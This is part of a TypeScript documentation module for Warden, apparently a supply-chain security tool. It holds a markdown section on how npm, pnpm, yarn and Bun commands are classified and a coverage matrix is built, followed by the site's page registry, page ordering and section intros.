| install | npm \`install\`, \`i\`, \`add\`, \`update\`, \`up\`, \`upgrade\`; pnpm \`install\`, \`i\`, \`add\`, \`update\`, \`up\`; yarn \`install\`, \`i\`, \`add\`, \`up\`, \`upgrade\`; bun \`install\`, \`i\`, \`add\`, \`update\` |

Inside the install branch, \`-g\` or \`--global\` makes it \`global-install\`, otherwise the presence of \`--frozen-lockfile\`, \`--immutable\`, \`--frozen\`, or \`--no-save\` promotes it to \`frozen-install\`. That means \`npm install --no-save lodash\` classifies as a frozen install.

\`graphTransaction\` is true for every \`FROZEN_VERBS\` match, and in the install branch only when no package specs were given, so \`npm install\` plans a transaction and \`npm install lodash\` does not. \`suppressScripts\` and \`suppressEnv\` come from \`SUPPRESS_FLAGS\` and \`SUPPRESS_ENV\`: \`--ignore-scripts\` for npm and pnpm, \`YARN_ENABLE_SCRIPTS=0\` for yarn, nothing for bun. Both are forced empty for \`exec\` and \`passthrough\`. \`coverage\` is \`protected\` for every kind except \`passthrough\`, which is \`not-applicable\`; the \`observed\` and \`unsupported\` values in the \`Coverage\` type are never produced by \`planCommand\`.

\`classifySpec\` sorts each argument into \`git\` (\`git+\`, \`git:\`, \`ssh:\`, \`github:\`, or a bare \`owner/repo\`), \`remote\` (\`http:\`/\`https:\`), \`file\` (\`file:\`, \`link:\`, \`portal:\`, \`./\`, \`../\`, absolute), \`workspace\` (\`workspace:\`), or \`registry\`. Registry specs go to \`specs\`, everything else to \`exotic\`, so a non-registry source is recorded rather than dropped. \`collectSpecs\` skips value-taking flags and their argument (\`--filter\`, \`--registry\`, \`--workspace\`, and others in \`VALUE_FLAGS\`). \`collectExecSpecs\` is different: it honours \`--package\`/\`-p\`, stops at the first positional, and skips a \`VALUE_FLAGS\` token without skipping its value, so \`npx --registry https://r/ cowsay\` records \`https://r/\` as a remote exotic spec and returns no package. \`bun pm trust esbuild\` classifies as \`rebuild\` with \`specs\` of \`["trust", "esbuild"]\`, because rebuild uses the general collector and does not know bun's subcommands.

## Deriving the coverage matrix

\`COVERAGE_MATRIX\` is generated from the same four verb tables, iterating \`npm\`, \`pnpm\`, \`yarn\`, \`bun\` and emitting one row per verb with a fixed note per kind, then appending two hardcoded rows for \`npx <package>\` and \`bunx <package>\`. It is 42 rows today. Frozen rows that need a flag render as \`"install --frozen-lockfile"\`, so splitting a row's \`command\` on spaces reproduces the argv the parser sees. The test suite asserts exactly that round trip for every row whose command does not start with \`<\`, which is what stops the published matrix from drifting from the parser. \`global-install\` and \`passthrough\` have no rows, so the matrix lists mediated commands only.

\`warden coverage --json\` prints \`{ schema_version: 1, matrix, unsupported }\`, and \`warden shim-plan <manager> <args...>\` prints the \`CommandPlan\` verbatim. For an unknown tool it degrades to a three-field stub, \`{ kind: "passthrough", specs: [], exotic: [] }\`, rather than a full \`CommandPlan\`, so a consumer reading \`manager\` or \`coverage\` off that fallback gets \`undefined\`. \`UNSUPPORTED_PATHS\` holds five documented gaps: absolute executable paths, Corepack-managed shims, package managers run inside containers, arbitrary shell downloads piped to an interpreter, and Windows or PowerShell. The rendered output ends by stating that PATH shims are not an operating-system sandbox. Downstream, \`runWardenShimTransaction\` plans a graph transaction only for \`install\`, \`frozen-install\`, and \`global-install\`; \`exec\`, \`rebuild\`, and \`passthrough\` return a \`skipped\` result.
`;

const PAGES: DocPage[] = [
  {
    slug: "getting-started",
    title: "Getting started",
    description:
      "Install Warden, vet your first package, audit an existing project, and put the gate in CI.",
    section: "Start",
    body: gettingStarted,
    related: ["concepts", "cli"],
  },
  {
    slug: "concepts",
    title: "Concepts",
    description:
      "Verdicts, exit codes, categories, and the gate-then-verify loop that makes Warden's repairs trustworthy.",
    section: "Start",
    body: concepts,
    related: ["doctor", "intent", "agents", "how-a-verdict-is-reached", "signals-and-scoring", "getting-started"],
  },
  {
    slug: "doctor",
    title: "Doctor",
    description:
      "Audit dependencies against OSV, gate every candidate fix through the supply-chain engine, verify in isolation, then apply.",
    section: "Using Warden",
    body: doctor,
    related: ["concepts", "ci", "security", "how-repair-works"],
  },
  {
    slug: "intent",
    title: "Intent",
    description:
      "Verify that an agent's diff does what the prompt asked, and catch calls to APIs that do not exist.",
    section: "Using Warden",
    body: intent,
    related: ["agents", "security", "how-intent-works"],
  },
  {
    slug: "ci",
    title: "CI",
    description:
      "One command that gates a pull request on dependency changes, lockfile and script edits, and agent intent.",
    section: "Using Warden",
    body: ci,
    related: ["check-surfaces", "agents", "configuration"],
  },
  {
    slug: "check-surfaces",
    title: "Check surfaces",
    description:
      "Audit the lockfile, install scripts, and registry config: the places trust is lost without any package changing.",
    section: "Using Warden",
    body: checkSurfaces,
    related: ["ci", "security", "surfaces-and-grammar"],
  },
  {
    slug: "transactions",
    title: "Transactions",
    description:
      "Plan the complete prospective graph, approve exactly what needs approving, apply with scripts suppressed, and leave a receipt CI can verify.",
    section: "Start",
    body: transactions,
    related: ["policy", "coverage", "limitations", "how-a-plan-is-built"],
  },
  {
    slug: "policy",
    title: "Policy",
    description:
      "One manager-neutral policy compiled into npm, pnpm, Yarn, and Bun's own controls, with every gap named.",
    section: "Using Warden",
    body: policy,
    related: ["transactions", "configuration", "surfaces-and-grammar"],
  },
  {
    slug: "agents",
    title: "Agents",
    description:
      "The machine-readable surface: JSON on stdout, published schemas, stable exit codes, and the handoff bundle.",
    section: "Using Warden",
    body: agents,
    related: ["schemas", "intent", "cli"],
  },
  {
    slug: "security",
    title: "Threat model",
    description:
      "The documented incidents behind each rule: axios provenance downgrade, Shai-Hulud preinstall, npmjs.help, lockfile injection, and slopsquatting.",
    section: "Trust and boundaries",
    body: security,
    related: ["doctor", "check-surfaces", "name-attacks", "signals-and-scoring"],
  },
  {
    slug: "coverage",
    title: "Command coverage",
    description:
      "Exactly which package-manager commands the shims mediate, generated from the same grammar the shim executes.",
    section: "Trust and boundaries",
    body: coverage,
    related: ["limitations", "transactions", "surfaces-and-grammar"],
  },
  {
    slug: "limitations",
    title: "Limitations",
    description:
      "What Warden does not cover: shim bypasses, analysis limits, flat resolution, baselines, and what a score is not.",
    section: "Trust and boundaries",
    body: limitations,
    related: ["security", "coverage", "transactions", "how-a-verdict-is-reached", "benchmark"],
  },
  {
    slug: "configuration",
    title: "Configuration",
    description:
      "User config, project policy, environment variables, interception, and every file Warden writes.",
    section: "Reference",
    body: configuration,
    related: ["ci", "troubleshooting"],
  },
  {
    slug: "schemas",
    title: "JSON schemas",
    description:
      "Every structured report Warden produces, discoverable at runtime through warden schema.",
    section: "Reference",
    body: schemas,
    related: ["agents", "cli"],
  },
  {
    slug: "troubleshooting",
    title: "Troubleshooting",
    description:
      "False positives, unsupported lockfiles, exit code 30, missing merge bases, and removing Warden.",
    section: "Reference",
    body: troubleshooting,
    related: ["configuration", "cli", "releases"],
  },
  {
    slug: "interception",
    title: "Interception",
    description:
      "How the shims put Warden in front of npm, pnpm, yarn, and Bun, what each decision does to your install, and where interception genuinely ends.",
    section: "Using Warden",
    body: interception,
    related: ["coverage", "transactions", "limitations", "how-a-plan-is-built"],
  },
  {
    slug: "explain",
    title: "Explaining a decision",
    description:
      "What changed, why it matters, what was prevented, and what to do next, plus artifact inventory, trusted baselines, comparison, and history.",
    section: "Using Warden",
    body: explain,
    related: ["concepts", "transactions", "limitations", "signals-and-scoring", "name-attacks"],
  },
  {
    slug: "benchmark",
    title: "Benchmark",
    description:
      "Detection and false-positive rates against a published corpus, what counts as caught, and what these numbers deliberately are not.",
    section: "Trust and boundaries",
    body: benchmark,
    related: ["limitations", "security", "coverage", "signals-and-scoring"],
  },
  {
    slug: "releases",
    title: "Releases and trust chain",
    description:
      "How Warden reaches your machine: one immutable release tag, every executable file checksum-verified, and nothing fetched from a mutable branch.",
    section: "Reference",
    body: releases,
    related: ["troubleshooting", "limitations"],
  },
  {
    slug: "how-a-verdict-is-reached",
    title: "How a verdict is reached",
    description:
      "The exact path a single check takes, in the order the code runs it, and the four ways it can end badly.",
    section: "How it works",
    body: engineInternals,
    related: ["concepts", "explain", "limitations"],
  },
  {
    slug: "signals-and-scoring",
    title: "Signals and scoring",
    description:
      "What the AST scan looks for, how a signal is shaped, and the first-match ladder that turns signals into allow, warn, or block.",
    section: "How it works",
    body: heuristicsInternals,
    related: ["how-a-verdict-is-reached", "explain", "benchmark"],
  },
  {
    slug: "name-attacks",
    title: "Name attacks",
    description:
      "How typosquat and slopsquat detection work, and why edit distance alone was not enough.",
    section: "How it works",
    body: namesInternals,
    related: ["how-a-verdict-is-reached", "security"],
  },
  {
    slug: "how-a-plan-is-built",
    title: "How a plan is built",
    description:
      "Breadth-first registry resolution, one version per name, the node and check budgets, the delta, and how apply suppresses scripts and rolls back.",
    section: "How it works",
    body: graphInternals,
    related: ["transactions", "limitations", "interception"],
  },
  {
    slug: "how-intent-works",
    title: "How intent verification works",
    description:
      "Prompt to claims, diff to classified hunks, the matching that produces delivered, partial, dropped, and scope creep, and the hallucinated-API scan.",
    section: "How it works",
    body: intentInternals,
    related: ["intent", "agents"],
  },
  {
    slug: "how-repair-works",
    title: "How repair works",
    description:
      "The audit, gate, verify, apply loop, and exactly when a dependency is reported unfixable.",
    section: "How it works",
    body: doctorInternals,
    related: ["doctor", "how-a-verdict-is-reached"],
  },
  {
    slug: "surfaces-and-grammar",
    title: "Surfaces and the command grammar",
    description:
      "How the lockfile, script, and config audits work, and how a package-manager command is classified into the coverage matrix.",
    section: "How it works",
    body: surfacesInternals,
    related: ["check-surfaces", "coverage", "interception"],
  },
];

const PAGE_ORDER = [
  "getting-started",
  "concepts",
  "transactions",
  "interception",
  "explain",
  "ci",
  "agents",
  "policy",
  "doctor",
  "intent",
  "check-surfaces",
  "coverage",
  "limitations",
  "security",
  "benchmark",
  "configuration",
  "schemas",
  "troubleshooting",
  "releases",
  "how-a-verdict-is-reached",
  "signals-and-scoring",
  "name-attacks",
  "how-a-plan-is-built",
  "how-intent-works",
  "how-repair-works",
  "surfaces-and-grammar",
];

export const DOC_PAGES: DocPage[] = [...PAGES].sort(
  (a, b) => PAGE_ORDER.indexOf(a.slug) - PAGE_ORDER.indexOf(b.slug),
);

export const DOC_SECTIONS = [
  "Start",
  "Using Warden",
  "Trust and boundaries",
  "Reference",
  "How it works",
] as const;

export function docBySlug(slug: string): DocPage | undefined {
  return DOC_PAGES.find((page) => page.slug === slug);
}

export function commandBySlug(name: string): CommandRef | undefined {
  return COMMANDS.find((command) => command.name === name);
}

export function readingMinutes(page: DocPage): number {
  return Math.max(1, Math.round(page.body.trim().split(/\s+/).length / 220));
}

export const SECTION_INTROS: Record<string, string> = {
  Start: "The mental model. Three pages, about fifteen minutes, and everything else follows from them.",
  "Using Warden": "Task guides. Read the one that matches what you are doing; they do not need to be read in order.",
  "Trust and boundaries":
    "What is actually covered, what is not, and the measured numbers behind the claims.",
  Reference: "Lookup material. Come here when you need a specific flag, file, or schema.",
  "How it works":
    "Optional depth. None of the reading paths go here. Come when you want to know why a decision came out the way it did, or before trusting the tool with something that matters.",
};
